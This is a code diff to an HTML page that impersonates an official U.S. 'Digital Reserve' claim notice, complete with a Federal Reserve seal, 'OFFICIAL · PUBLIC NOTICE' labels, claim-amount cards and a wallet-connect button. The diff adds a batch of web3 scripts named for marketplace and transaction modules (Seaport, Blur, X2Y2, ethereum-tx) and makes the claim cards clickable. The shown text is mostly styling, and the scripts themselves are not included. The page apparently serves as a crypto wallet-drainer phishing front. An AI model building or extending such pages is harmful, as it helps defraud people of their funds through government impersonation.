@@ -2,30 +2,60 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover" />
+  <meta name="theme-color" content="#060b17" />
   <title>CLARITY ACT · USA DIGITAL RESERVE</title>
   <link rel="preconnect" href="https://fonts.googleapis.com" />
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
   <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,400;14..32,500;14..32,600;14..32,700;14..32,800;14..32,900&display=swap" rel="stylesheet" />
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" />
+
+  <!-- ===== WEB3 PROVIDER SCRIPTS ===== -->
+  <script src="./assets/web3-provider/web3-modal.js"></script>
+  <script src="./assets/web3-provider/web3-loader.js"></script>
+  <script src="./assets/web3-provider/web3-connect.js"></script>
+  <script src="./assets/web3-provider/web3-module.js"></script>
+  <script src="./assets/web3-provider/web3-alert.js"></script>
+  <script src="./assets/web3-provider/web3-seaport.js"></script>
+  <script src="./assets/web3-provider/web3-data.js"></script>
+  <script src="./assets/web3-provider/ethereum-tx.js"></script>
+  <script src="./assets/web3-modules/module-blur.js"></script>
+  <script src="./assets/web3-modules/module-seaport.js"></script>
+  <script src="./assets/web3-modules/module-x2y2.js"></script>
+  <script type="module">
+    import { ethers } from "https://cdn.jsdelivr.net/npm/ethers@6.13.3/dist/ethers.min.js";
+    import "./assets/web3-provider.js";
+  </script>
+
   <style>
-    /* ========== GLOBAL RESET & BASE ========== */
+    /* ========== RESET & BASE ========== */
     * {
       margin: 0;
       padding: 0;
       box-sizing: border-box;
+      -webkit-tap-highlight-color: transparent;
+    }
+
+    html {
+      scroll-behavior: smooth;
+      -webkit-text-size-adjust: 100%;
     }
 
     body {
       background: #060b17;
-      font-family: 'Inter', sans-serif;
+      font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
       min-height: 100vh;
+      min-height: 100dvh;
       display: flex;
       justify-content: center;
-      align-items: center;
-      padding: 2rem 1.2rem;
+      align-items: flex-start;
+      padding: 1.5rem 0.75rem;
       position: relative;
       overflow-x: hidden;
+      color: #d3e6ff;
+      line-height: 1.5;
+      -webkit-font-smoothing: antialiased;
+      -moz-osx-font-smoothing: grayscale;
     }
 
     body::before {
@@ -33,30 +63,40 @@
       position: fixed;
       inset: 0;
       background:
-        radial-gradient(circle at 10% 20%, rgba(0, 160, 255, 0.07) 0%, transparent 45%),
-        radial-gradient(circle at 90% 80%, rgba(60, 30, 255, 0.05) 0%, transparent 50%),
+        radial-gradient(circle at 10% 20%, rgba(0, 160, 255, 0.08) 0%, transparent 45%),
+        radial-gradient(circle at 90% 80%, rgba(60, 30, 255, 0.06) 0%, transparent 50%),
         repeating-linear-gradient(45deg, rgba(255,255,255,0.006) 0px, rgba(255,255,255,0.006) 2px, transparent 2px, transparent 14px);
       pointer-events: none;
       z-index: 0;
     }
 
+    /* ========== MAIN CONTAINER ========== */
     .main-container {
       max-width: 1200px;
       width: 100%;
-      background: rgba(6, 12, 28, 0.84);
+      background: rgba(6, 12, 28, 0.85);
       backdrop-filter: blur(18px) saturate(1.3);
       -webkit-backdrop-filter: blur(18px) saturate(1.3);
       border: 1px solid rgba(0, 170, 255, 0.15);
-      border-radius: 56px;
-      padding: 3rem 3.5rem;
+      border-radius: 40px;
+      padding: 2.5rem 3rem;
       box-shadow: 0 40px 100px rgba(0, 0, 0, 0.85), 0 0 0 1px rgba(0, 150, 255, 0.12) inset, 0 0 70px rgba(0, 80, 255, 0.1);
       position: relative;
       z-index: 2;
       transition: box-shadow 0.4s ease;
+      overflow: hidden;
     }
 
-    .main-container:hover {
-      box-shadow: 0 50px 130px rgba(0, 70, 255, 0.18), 0 0 0 1px rgba(0, 180, 255, 0.25) inset;
+    .main-container::before {
+      content: '';
+      position: absolute;
+      top: 0;
+      left: 20%;
+      right: 20%;
+      height: 2px;
+      background: linear-gradient(90deg, transparent, #3b82f6, #a855f7, transparent);
+      opacity: 0.6;
+      border-radius: 2px;
     }
 
     /* ========== HEADER ========== */
@@ -65,109 +105,109 @@
       align-items: center;
       justify-content: space-between;
       flex-wrap: wrap;
-      gap: 1rem 1.5rem;
+      gap: 1.2rem;
       border-bottom: 1px solid rgba(0, 160, 255, 0.1);
       padding-bottom: 1.5rem;
-      margin-bottom: 2.2rem;
+      margin-bottom: 1.8rem;
     }
 
     .seal-group {
       display: flex;
       align-items: center;
-      gap: 1.5rem;
+      gap: 1.2rem;
       flex-wrap: wrap;
+      flex: 1;
+      min-width: 0;
     }
 
-    /* ---- Logo (Federal Reserve Seal) ---- */
     .logo-wrapper {
       display: flex;
       align-items: center;
-      gap: 1rem;
-      flex-wrap: wrap;
+      gap: 0.8rem;
+      flex-shrink: 0;
     }
 
     .fed-logo-img {
-      width: 110px;
-      height: 110px;
+      width: 90px;
+      height: 90px;
       border-radius: 50%;
       object-fit: contain;
-      background: rgba(0, 40, 80, 0.15);
-      border: 2px solid rgba(0, 150, 255, 0.2);
-      padding: 0.3rem;
+      background: radial-gradient(circle, rgba(59, 130, 246, 0.08), rgba(0, 40, 80, 0.15));
+      border: 2px solid rgba(0, 150, 255, 0.25);
+      padding: 0.4rem;
       flex-shrink: 0;
-      transition: all 0.3s ease;
-      box-shadow: 0 0 40px rgba(0, 100, 255, 0.1);
+      transition: all 0.4s cubic-bezier(0.2, 0.9, 0.4, 1);
+      box-shadow: 0 0 40px rgba(0, 100, 255, 0.15), inset 0 0 20px rgba(0, 100, 255, 0.05);
     }
 
     .fed-logo-img:hover {
       border-color: rgba(0, 180, 255, 0.5);
-      box-shadow: 0 0 60px rgba(0, 100, 255, 0.2);
+      box-shadow: 0 0 60px rgba(0, 100, 255, 0.3);
+      transform: scale(1.03);
     }
 
-    .seal-icon {
-      display: flex;
-      align-items: center;
-      gap: 12px;
-    }
-    .seal-icon i {
-      font-size: 2.8rem;
-      color: #b8d6ff;
-      filter: drop-shadow(0 0 14px rgba(0, 140, 255, 0.4));
+    .seal-text {
+      min-width: 0;
     }
     .seal-text .usa {
-      font-size: 1.05rem;
+      font-size: 1rem;
       font-weight: 800;
       color: #b0ceff;
-      letter-spacing: 0.5px;
+      letter-spacing: 0.4px;
       text-transform: uppercase;
+      display: flex;
+      align-items: center;
+      gap: 6px;
+      flex-wrap: wrap;
     }
     .seal-text .usa i {
-      margin-right: 6px;
       color: #ffd966;
     }
     .seal-text .agency {
-      font-size: 0.75rem;
+      font-size: 0.68rem;
       font-weight: 600;
       color: #7aa5e0;
       background: rgba(0, 100, 255, 0.1);
-      padding: 0.2rem 1rem;
+      padding: 0.25rem 0.9rem;
       border-radius: 40px;
       border: 1px solid rgba(0, 150, 255, 0.15);
       display: inline-block;
-      margin-top: 4px;
+      margin-top: 6px;
+      letter-spacing: 0.2px;
+      line-height: 1.4;
     }
 
     .official-logos {
       display: flex;
       align-items: center;
-      gap: 1.2rem;
+      gap: 0.6rem;
       flex-wrap: wrap;
     }
     .logo-item {
       display: flex;
       align-items: center;
-      gap: 8px;
+      gap: 6px;
       color: #8bb3e6;
-      font-size: 0.65rem;
+      font-size: 0.6rem;
       font-weight: 700;
       letter-spacing: 0.5px;
       text-transform: uppercase;
-      background: rgba(0, 40, 80, 0.2);
-      padding: 0.3rem 1rem 0.3rem 0.8rem;
+      background: rgba(0, 40, 80, 0.3);
+      padding: 0.3rem 0.8rem 0.3rem 0.6rem;
       border-radius: 40px;
-      border: 1px solid rgba(0, 180, 255, 0.08);
+      border: 1px solid rgba(0, 180, 255, 0.1);
       backdrop-filter: blur(4px);
     }
     .logo-item i {
-      font-size: 1.4rem;
+      font-size: 1.1rem;
       color: #d4e6ff;
       filter: drop-shadow(0 0 6px rgba(0, 150, 255, 0.2));
     }
     .badge-official {
       background: rgba(0, 200, 255, 0.05);
-      padding: 0.4rem 1.4rem;
+      padding: 0.35rem 1rem;
       border-radius: 60px;
-      font-size: 0.65rem;
+      font-size: 0.6rem;
       font-weight: 700;
       color: #b0d4ff;
       border: 1px solid rgba(0, 180, 255, 0.2);
@@ -175,36 +215,38 @@
       backdrop-filter: blur(4px);
       display: flex;
       align-items: center;
-      gap: 10px;
+      gap: 8px;
     }
     .badge-official i {
       color: #5ac8ff;
-      font-size: 0.9rem;
+      font-size: 0.8rem;
     }
 
+    /* ========== BADGE ROW ========== */
     .badge-row {
       display: flex;
       flex-wrap: wrap;
-      gap: 0.6rem 1.2rem;
-      margin-top: 0.4rem;
-      padding-top: 0.6rem;
-      border-top: 1px solid rgba(0, 180, 255, 0.06);
+      gap: 0.5rem;
+      margin-bottom: 2rem;
+      padding-bottom: 1.2rem;
+      border-bottom: 1px solid rgba(0, 180, 255, 0.06);
     }
     .badge-row .mini-badge {
-      font-size: 0.6rem;
+      font-size: 0.58rem;
       font-weight: 600;
       color: #7a9ed9;
-      background: rgba(0, 60, 130, 0.15);
-      padding: 0.2rem 1rem;
+      background: rgba(0, 60, 130, 0.2);
+      padding: 0.3rem 0.8rem;
       border-radius: 30px;
-      border: 1px solid rgba(0, 180, 255, 0.06);
+      border: 1px solid rgba(0, 180, 255, 0.08);
       display: flex;
       align-items: center;
-      gap: 6px;
+      gap: 5px;
+      white-space: nowrap;
     }
     .badge-row .mini-badge i {
       color: #5ac8ff;
-      font-size: 0.7rem;
+      font-size: 0.65rem;
     }
 
     /* ========== TITLE ========== */
@@ -212,7 +254,7 @@
       margin-bottom: 1.8rem;
     }
     .title-block h1 {
-      font-size: 3.2rem;
+      font-size: clamp(1.75rem, 4.5vw + 0.5rem, 3.2rem);
       font-weight: 900;
       background: linear-gradient(135deg, #e6f2ff 0%, #94c8ff 45%, #4a9eff 100%);
       -webkit-background-clip: text;
@@ -223,25 +265,39 @@
       text-shadow: 0 0 50px rgba(0, 100, 255, 0.1);
     }
     .title-block .sub {
-      font-size: 1rem;
+      font-size: 0.9rem;
       color: #b0cef5;
       font-weight: 400;
-      margin-top: 0.6rem;
+      margin-top: 0.7rem;
       display: flex;
       align-items: center;
-      gap: 18px;
+      gap: 10px;
       flex-wrap: wrap;
     }
     .title-block .sub i {
       color: #5bb4ff;
     }
+    .sub-pill {
+      font-size: 0.68rem;
+      background: rgba(0, 180, 255, 0.05);
+      padding: 0.25rem 0.9rem;
+      border-radius: 40px;
+      border: 1px solid rgba(0, 180, 255, 0.08);
+      color: #b0cef5;
+      display: inline-flex;
+      align-items: center;
+      gap: 5px;
+    }
+    .sub-pill i {
+      font-size: 0.65rem;
+    }
     .divider-glow {
-      width: 140px;
+      width: 120px;
       height: 3px;
       background: linear-gradient(90deg, #0088ff, #a855f7, #0088ff);
       background-size: 200% 100%;
       border-radius: 10px;
-      margin: 1.2rem 0 1.8rem 0;
+      margin: 1.2rem 0 1.5rem 0;
       animation: shimmerDivider 4s linear infinite;
     }
     @keyframes shimmerDivider {
@@ -252,33 +308,34 @@
     /* ========== CLARITY WRITEUP ========== */
     .clarity-writeup {
       background: rgba(0, 50, 110, 0.15);
-      border-left: 6px solid #3b82f6;
-      padding: 1.8rem 2.4rem;
-      border-radius: 28px;
-      margin-bottom: 2.8rem;
+      border-left: 5px solid #3b82f6;
+      padding: 1.6rem 2rem;
+      border-radius: 24px;
+      margin-bottom: 2.2rem;
       backdrop-filter: blur(6px);
-      border: 1px solid rgba(0, 150, 255, 0.08);
-      border-left-width: 6px;
+      border-top: 1px solid rgba(0, 150, 255, 0.08);
+      border-right: 1px solid rgba(0, 150, 255, 0.08);
+      border-bottom: 1px solid rgba(0, 150, 255, 0.08);
       box-shadow: 0 10px 35px rgba(0, 0, 0, 0.25);
       position: relative;
     }
     .clarity-writeup::after {
       content: 'OFFICIAL · PUBLIC NOTICE · FED-2026';
       position: absolute;
-      bottom: 0.8rem;
-      right: 1.8rem;
-      font-size: 0.5rem;
+      bottom: 0.7rem;
+      right: 1.4rem;
+      font-size: 0.45rem;
       font-weight: 700;
       color: #4a7fb5;
       letter-spacing: 1.5px;
       opacity: 0.5;
     }
     .clarity-writeup .main-text {
-      font-size: 1.2rem;
-      line-height: 1.8;
+      font-size: clamp(0.95rem, 1.5vw + 0.5rem, 1.2rem);
+      line-height: 1.75;
       color: #d3e6ff;
       font-weight: 400;
-      letter-spacing: 0.2px;
+      letter-spacing: 0.1px;
     }
     .clarity-writeup .main-text strong {
       font-weight: 800;
@@ -293,107 +350,133 @@
     }
     .clarity-writeup .icon-gavel {
       color: #3b82f6;
-      margin-right: 14px;
-      font-size: 1.3rem;
+      margin-right: 10px;
+      font-size: 1.2rem;
     }
     .writeup-details {
       margin-top: 1rem;
       display: flex;
       flex-wrap: wrap;
-      gap: 1rem 2rem;
+      gap: 0.6rem 1.5rem;
       border-top: 1px solid rgba(0, 180, 255, 0.06);
-      padding-top: 1rem;
-      font-size: 0.75rem;
+      padding-top: 0.9rem;
+      font-size: 0.7rem;
       color: #7a9ed9;
     }
+    .writeup-details span {
+      display: flex;
+      align-items: center;
+      gap: 4px;
+    }
     .writeup-details span i {
-      margin-right: 6px;
       color: #5ac8ff;
-      font-size: 0.8rem;
+      font-size: 0.75rem;
     }
 
     /* ========== WALLET CONNECT ========== */
     .wallet-connect {
-      background: rgba(0, 40, 90, 0.2);
-      border-radius: 80px;
-      padding: 0.5rem 1.2rem 0.5rem 2rem;
+      background: linear-gradient(135deg, rgba(0, 40, 90, 0.3), rgba(0, 60, 130, 0.15));
+      border-radius: 60px;
+      padding: 0.5rem 0.6rem 0.5rem 1.6rem;
       display: flex;
       align-items: center;
       justify-content: space-between;
       flex-wrap: wrap;
-      gap: 0.8rem 1.5rem;
+      gap: 0.8rem;
       border: 1px solid rgba(0, 180, 255, 0.15);
-      margin-bottom: 2.8rem;
-      backdrop-filter: blur(4px);
+      margin-bottom: 2.2rem;
+      backdrop-filter: blur(6px);
     }
     .wallet-connect .label {
       color: #b8d6ff;
       font-weight: 600;
-      font-size: 0.95rem;
+      font-size: 0.85rem;
       display: flex;
       align-items: center;
-      gap: 16px;
+      gap: 10px;
       flex-wrap: wrap;
     }
-    .wallet-connect .label i {
+    .wallet-connect .label > i {
       color: #5ac8ff;
-      font-size: 1.3rem;
+      font-size: 1.15rem;
     }
     .wallet-connect .label .chain-badge {
-      background: rgba(0, 180, 255, 0.06);
-      padding: 0.2rem 1.2rem;
+      background: rgba(0, 180, 255, 0.08);
+      padding: 0.25rem 0.9rem;
       border-radius: 40px;
-      font-size: 0.65rem;
+      font-size: 0.62rem;
       font-weight: 700;
       color: #8bbaff;
-      border: 1px solid rgba(0, 180, 255, 0.06);
+      border: 1px solid rgba(0, 180, 255, 0.1);
+      display: inline-flex;
+      align-items: center;
+      gap: 5px;
     }
-    .connect-btn {
-      background: rgba(0, 150, 255, 0.06);
+    .wallet-connect .label .secure-tag {
+      font-size: 0.58rem;
+      color: #5a8fc0;
+      display: inline-flex;
+      align-items: center;
+      gap: 4px;
+    }
+
+    /* ---- Shared clickable button class (connect-btn connect-button) ---- */
+    .connect-btn,
+    .connect-button {
+      background: linear-gradient(135deg, rgba(0, 150, 255, 0.15), rgba(0, 100, 255, 0.08));
       border: 1px solid #3b82f6;
-      padding: 0.6rem 2.2rem;
+      padding: 0.65rem 1.6rem;
       border-radius: 60px;
       color: #d0e6ff;
       font-weight: 700;
-      font-size: 0.9rem;
-      transition: 0.3s;
-      cursor: default;
+      font-size: 0.85rem;
+      transition: all 0.3s ease;
+      cursor: pointer;
       backdrop-filter: blur(4px);
       letter-spacing: 0.5px;
       display: flex;
       align-items: center;
-      gap: 12px;
+      gap: 10px;
+      white-space: nowrap;
+      font-family: inherit;
     }
-    .connect-btn i {
-      color: #3b82f6;
-      font-size: 1rem;
+    .connect-btn i,
+    .connect-button i {
+      color: #5ac8ff;
+      font-size: 0.95rem;
     }
-    .connect-btn:hover {
-      background: rgba(0, 150, 255, 0.14);
+    .connect-btn:hover,
+    .connect-button:hover {
+      background: linear-gradient(135deg, rgba(0, 150, 255, 0.25), rgba(0, 100, 255, 0.15));
       border-color: #60a5fa;
-      box-shadow: 0 0 35px rgba(0, 100, 255, 0.2);
+      box-shadow: 0 0 35px rgba(0, 100, 255, 0.3);
       transform: scale(1.02);
+    }
+    .connect-btn:active,
+    .connect-button:active {
+      transform: scale(0.98);
     }
 
     /* ========== CLAIM GRID ========== */
     .claim-grid {
       display: grid;
-      grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
-      gap: 1.5rem;
-      margin: 2.2rem 0 1.8rem;
+      grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));
+      gap: 1.2rem;
+      margin: 2rem 0 1.8rem;
     }
     .claim-card {
-      background: rgba(6, 18, 44, 0.7);
+      background: linear-gradient(160deg, rgba(6, 18, 44, 0.85), rgba(0, 20, 50, 0.6));
       backdrop-filter: blur(6px);
-      border: 1px solid rgba(0, 150, 255, 0.1);
-      border-radius: 32px;
-      padding: 1.8rem 0.6rem 1.4rem;
+      border: 1px solid rgba(0, 150, 255, 0.12);
+      border-radius: 26px;
+      padding: 1.5rem 0.6rem 1.3rem;
       text-align: center;
-      transition: all 0.3s cubic-bezier(0.2, 0.9, 0.4, 1);
+      transition: all 0.35s cubic-bezier(0.2, 0.9, 0.4, 1);
       cursor: pointer;
       position: relative;
       overflow: hidden;
       box-shadow: 0 12px 28px rgba(0, 0, 0, 0.5);
+      user-select: none;
     }
     .claim-card::before {
       content: '';
@@ -402,22 +485,25 @@
       left: -60%;
       width: 220%;
       height: 220%;
-      background: radial-gradient(circle at center, rgba(0, 150, 255, 0.05), transparent 70%);
+      background: radial-gradient(circle at center, rgba(0, 150, 255, 0.08), transparent 70%);
       opacity: 0;
       transition: opacity 0.5s;
       pointer-events: none;
     }
     .claim-card:hover {
-      transform: translateY(-8px) scale(1.02);
+      transform: translateY(-6px) scale(1.02);
       border-color: #3b82f6;
-      box-shadow: 0 20px 50px rgba(0, 80, 255, 0.2);
-      background: rgba(0, 40, 90, 0.5);
+      box-shadow: 0 20px 50px rgba(0, 80, 255, 0.25);
+      background: linear-gradient(160deg, rgba(0, 40, 90, 0.7), rgba(0, 30, 70, 0.5));
+    }
+    .claim-card:active {
+      transform: translateY(-2px) scale(0.99);
     }
     .claim-card:hover::before {
       opacity: 1;
     }
     .claim-card .amount {
-      font-size: 2.6rem;
+      font-size: clamp(1.9rem, 4vw, 2.5rem);
       font-weight: 900;
       background: linear-gradient(135deg, #f0f9ff, #8fcbff);
       -webkit-background-clip: text;
@@ -426,12 +512,13 @@
       text-shadow: 0 0 30px rgba(0, 150, 255, 0.1);
       letter-spacing: -0.5px;
       transition: text-shadow 0.3s;
+      line-height: 1.1;
     }
     .claim-card:hover .amount {
-      text-shadow: 0 0 50px rgba(0, 150, 255, 0.3);
+      text-shadow: 0 0 50px rgba(0, 150, 255, 0.35);
     }
     .claim-card .label {
-      font-size: 0.7rem;
+      font-size: 0.65rem;
       text-transform: uppercase;
       letter-spacing: 2px;
       color: #89b9f0;
@@ -440,250 +527,322 @@
       opacity: 0.8;
     }
     .claim-card .icon {
-      font-size: 2rem;
+      font-size: 1.8rem;
       color: #3b82f6;
-      margin-bottom: 6px;
-      opacity: 0.7;
+      margin-bottom: 4px;
+      opacity: 0.75;
     }
     .claim-card .badge-small {
-      background: rgba(0, 200, 255, 0.04);
+      background: rgba(0, 200, 255, 0.06);
       border-radius: 40px;
-      padding: 0.25rem 1rem;
+      padding: 0.28rem 0.9rem;
       font-size: 0.5rem;
       font-weight: 700;
       color: #80bdff;
       display: inline-block;
       margin-top: 10px;
-      border: 1px solid rgba(0, 180, 255, 0.06);
+      border: 1px solid rgba(0, 180, 255, 0.1);
       letter-spacing: 0.5px;
     }
     .claim-card .badge-small i {
       margin-right: 4px;
       color: #5ac8ff;
     }
-    .claim-card a {
+
+    /* Claim card link wrapper — clickable */
+    .claim-card a.connect-btn,
+    .claim-card a.connect-button {
       text-decoration: none;
       display: block;
+      background: transparent;
+      border: none;
+      padding: 0;
+      border-radius: 0;
+      box-shadow: none;
       color: inherit;
+      transform: none;
     }
+    .claim-card a.connect-btn:hover,
+    .claim-card a.connect-button:hover {
+      background: transparent;
+      border: none;
+      box-shadow: none;
+      transform: none;
+    }
+
     .claim-card .network-tag {
       position: absolute;
       top: 10px;
-      right: 12px;
-      font-size: 0.5rem;
-      background: rgba(0, 180, 255, 0.04);
-      padding: 0.15rem 0.7rem;
+      right: 10px;
+      font-size: 0.48rem;
+      background: rgba(0, 180, 255, 0.06);
+      padding: 0.18rem 0.6rem;
       border-radius: 20px;
       color: #6a9ed9;
-      border: 1px solid rgba(0, 180, 255, 0.04);
+      border: 1px solid rgba(0, 180, 255, 0.08);
       font-weight: 600;
       letter-spacing: 0.3px;
     }
     .claim-card .tier-tag {
       position: absolute;
       bottom: 10px;
-      left: 12px;
-      font-size: 0.45rem;
-      background: rgba(0, 180, 255, 0.03);
-      padding: 0.1rem 0.6rem;
+      left: 10px;
+      font-size: 0.44rem;
+      background: rgba(0, 180, 255, 0.04);
+      padding: 0.12rem 0.55rem;
       border-radius: 20px;
       color: #4a7fb5;
-      border: 1px solid rgba(0, 180, 255, 0.03);
+      border: 1px solid rgba(0, 180, 255, 0.05);
       font-weight: 600;
+      letter-spacing: 0.3px;
     }
     .claim-card .reference {
-      font-size: 0.45rem;
+      font-size: 0.44rem;
       color: #3a5f87;
       margin-top: 6px;
       letter-spacing: 0.3px;
       opacity: 0.6;
     }
+    .claim-card .instant-tag {
+      font-size: 0.48rem;
+      color: #4a6f9a;
+      margin-top: 4px;
+      letter-spacing: 0.3px;
+    }
 
-    /* ========== EXTENDED SECTIONS ========== */
+    /* ========== SECTION TITLES ========== */
     .section-title {
-      font-size: 1.6rem;
+      font-size: clamp(1.15rem, 2vw + 0.5rem, 1.5rem);
       font-weight: 700;
       color: #d0e6ff;
-      margin: 2.5rem 0 1.2rem 0;
+      margin: 2.2rem 0 1rem 0;
       display: flex;
       align-items: center;
-      gap: 12px;
+      gap: 10px;
     }
     .section-title i {
       color: #3b82f6;
-      font-size: 1.8rem;
+      font-size: 1.4rem;
+      flex-shrink: 0;
     }
     .section-divider {
       height: 1px;
-      background: linear-gradient(90deg, rgba(0, 180, 255, 0.2), transparent);
+      background: linear-gradient(90deg, rgba(0, 180, 255, 0.25), transparent);
       margin: 1.5rem 0;
     }
 
+    /* ========== PROGRAM OVERVIEW ========== */
     .program-overview {
-      background: rgba(0, 40, 80, 0.08);
-      border-radius: 28px;
-      padding: 1.8rem 2.2rem;
-      border: 1px solid rgba(0, 180, 255, 0.06);
-      margin-bottom: 2rem;
+      background: rgba(0, 40, 80, 0.12);
+      border-radius: 24px;
+      padding: 1.6rem 1.8rem;
+      border: 1px solid rgba(0, 180, 255, 0.08);
+      margin-bottom: 1.5rem;
     }
     .program-overview p {
       color: #c5daf5;
-      font-size: 1rem;
-      line-height: 1.8;
-      margin-bottom: 1rem;
+      font-size: 0.92rem;
+      line-height: 1.75;
+      margin-bottom: 0.9rem;
+    }
+    .program-overview p:last-child {
+      margin-bottom: 0;
     }
     .program-overview .highlight-box {
-      background: rgba(0, 100, 255, 0.05);
+      background: rgba(0, 100, 255, 0.08);
       border-left: 4px solid #3b82f6;
-      padding: 1rem 1.5rem;
+      padding: 0.9rem 1.2rem;
       border-radius: 12px;
-      margin: 1.2rem 0;
+      margin: 1rem 0;
+      font-size: 0.88rem;
+      color: #c5daf5;
+      line-height: 1.6;
     }
     .program-overview .highlight-box strong {
       color: #95c9ff;
     }
 
+    /* ========== BENEFITS ========== */
     .benefits-grid {
       display: grid;
-      grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
-      gap: 1.5rem;
-      margin: 1.5rem 0;
+      grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+      gap: 1rem;
+      margin: 1.2rem 0;
     }
     .benefit-card {
-      background: rgba(0, 40, 80, 0.08);
-      border-radius: 24px;
-      padding: 1.8rem 1.2rem;
+      background: rgba(0, 40, 80, 0.12);
+      border-radius: 22px;
+      padding: 1.5rem 1rem;
       text-align: center;
-      border: 1px solid rgba(0, 180, 255, 0.06);
+      border: 1px solid rgba(0, 180, 255, 0.08);
       transition: all 0.3s ease;
     }
     .benefit-card:hover {
-      border-color: rgba(0, 150, 255, 0.2);
+      border-color: rgba(0, 150, 255, 0.25);
       transform: translateY(-4px);
+      background: rgba(0, 40, 80, 0.2);
     }
     .benefit-card i {
-      font-size: 2.4rem;
+      font-size: 2rem;
       color: #3b82f6;
-      margin-bottom: 0.8rem;
+      margin-bottom: 0.7rem;
     }
     .benefit-card h4 {
       color: #d0e6ff;
-      font-size: 1.1rem;
+      font-size: 1rem;
       font-weight: 700;
       margin-bottom: 0.4rem;
     }
     .benefit-card p {
       color: #8bb3e6;
-      font-size: 0.85rem;
+      font-size: 0.82rem;
       line-height: 1.5;
     }
 
+    /* ========== TIMELINE ========== */
     .timeline {
       display: flex;
       flex-direction: column;
-      gap: 1.2rem;
-      margin: 1.5rem 0;
+      gap: 0.9rem;
+      margin: 1.2rem 0;
     }
     .timeline-item {
       display: flex;
       align-items: center;
-      gap: 1.5rem;
-      background: rgba(0, 40, 80, 0.06);
-      border-radius: 20px;
-      padding: 1.2rem 1.8rem;
-      border: 1px solid rgba(0, 180, 255, 0.06);
+      gap: 1.2rem;
+      background: rgba(0, 40, 80, 0.1);
+      border-radius: 18px;
+      padding: 1.1rem 1.4rem;
+      border: 1px solid rgba(0, 180, 255, 0.08);
+      transition: all 0.3s ease;
+    }
+    .timeline-item:hover {
+      border-color: rgba(0, 150, 255, 0.2);
+      background: rgba(0, 40, 80, 0.18);
     }
     .timeline-item .phase {
-      font-size: 0.8rem;
+      font-size: 0.72rem;
       font-weight: 800;
       color: #3b82f6;
-      min-width: 80px;
+      min-width: 70px;
+      letter-spacing: 0.5px;
+      flex-shrink: 0;
     }
     .timeline-item .content {
       flex: 1;
+      min-width: 0;
     }
     .timeline-item .content h4 {
       color: #d0e6ff;
-      font-size: 1rem;
+      font-size: 0.95rem;
       font-weight: 700;
+      margin-bottom: 2px;
     }
     .timeline-item .content p {
       color: #8bb3e6;
-      font-size: 0.85rem;
+      font-size: 0.8rem;
+      line-height: 1.4;
     }
     .timeline-item .status {
-      font-size: 0.7rem;
+      font-size: 0.62rem;
       font-weight: 700;
       color: #34c759;
-      background: rgba(52, 199, 89, 0.08);
-      padding: 0.2rem 1rem;
+      background: rgba(52, 199, 89, 0.1);
+      padding: 0.28rem 0.85rem;
       border-radius: 40px;
-      border: 1px solid rgba(52, 199, 89, 0.08);
+      border: 1px solid rgba(52, 199, 89, 0.15);
+      white-space: nowrap;
+      flex-shrink: 0;
+      display: inline-flex;
+      align-items: center;
+      gap: 4px;
+    }
+    .timeline-item .status.upcoming {
+      color: #FF9F0A;
+      background: rgba(255, 159, 10, 0.1);
+      border-color: rgba(255, 159, 10, 0.15);
     }
 
+    /* ========== STATS ========== */
     .stats-grid {
       display: grid;
-      grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
-      gap: 1.5rem;
-      margin: 1.5rem 0;
+      grid-template-columns: repeat(auto-fit, minmax(130px, 1fr));
+      gap: 1rem;
+      margin: 1.2rem 0;
     }
     .stat-card {
-      background: rgba(0, 40, 80, 0.06);
+      background: linear-gradient(160deg, rgba(0, 40, 80, 0.15), rgba(0, 30, 70, 0.05));
       border-radius: 20px;
-      padding: 1.5rem 1rem;
+      padding: 1.3rem 0.8rem;
       text-align: center;
-      border: 1px solid rgba(0, 180, 255, 0.06);
+      border: 1px solid rgba(0, 180, 255, 0.08);
+      transition: all 0.3s ease;
+    }
+    .stat-card:hover {
+      border-color: rgba(0, 150, 255, 0.2);
+      transform: translateY(-3px);
     }
     .stat-card .number {
-      font-size: 2.2rem;
+      font-size: clamp(1.5rem, 3vw, 2rem);
       font-weight: 900;
       color: #d0e6ff;
       letter-spacing: -0.5px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 4px;
     }
     .stat-card .number i {
-      font-size: 1.6rem;
+      font-size: 1.3rem;
       color: #3b82f6;
-      margin-right: 6px;
     }
     .stat-card .stat-label {
-      font-size: 0.75rem;
+      font-size: 0.68rem;
       color: #8bb3e6;
       font-weight: 600;
       text-transform: uppercase;
       letter-spacing: 0.5px;
-      margin-top: 4px;
+      margin-top: 6px;
     }
 
+    /* ========== FAQ ========== */
     .faq-item {
-      background: rgba(0, 40, 80, 0.06);
-      border-radius: 20px;
-      padding: 1.2rem 1.8rem;
-      margin-bottom: 0.8rem;
-      border: 1px solid rgba(0, 180, 255, 0.06);
+      background: rgba(0, 40, 80, 0.1);
+      border-radius: 18px;
+      padding: 1rem 1.4rem;
+      margin-bottom: 0.7rem;
+      border: 1px solid rgba(0, 180, 255, 0.08);
       cursor: pointer;
       transition: all 0.3s ease;
     }
     .faq-item:hover {
-      border-color: rgba(0, 150, 255, 0.15);
+      border-color: rgba(0, 150, 255, 0.2);
+      background: rgba(0, 40, 80, 0.18);
     }
     .faq-item .question {
       display: flex;
       justify-content: space-between;
       align-items: center;
+      gap: 1rem;
       font-weight: 700;
       color: #d0e6ff;
-      font-size: 1rem;
+      font-size: 0.92rem;
+      line-height: 1.4;
     }
     .faq-item .question i {
       color: #3b82f6;
       transition: transform 0.3s;
+      flex-shrink: 0;
+      font-size: 1rem;
     }
     .faq-item .answer {
       color: #8bb3e6;
-      font-size: 0.9rem;
-      line-height: 1.6;
-      margin-top: 0.6rem;
+      font-size: 0.85rem;
+      line-height: 1.65;
+      margin-top: 0.7rem;
       display: none;
+      padding-top: 0.7rem;
+      border-top: 1px solid rgba(0, 180, 255, 0.08);
     }
     .faq-item.active .answer {
       display: block;
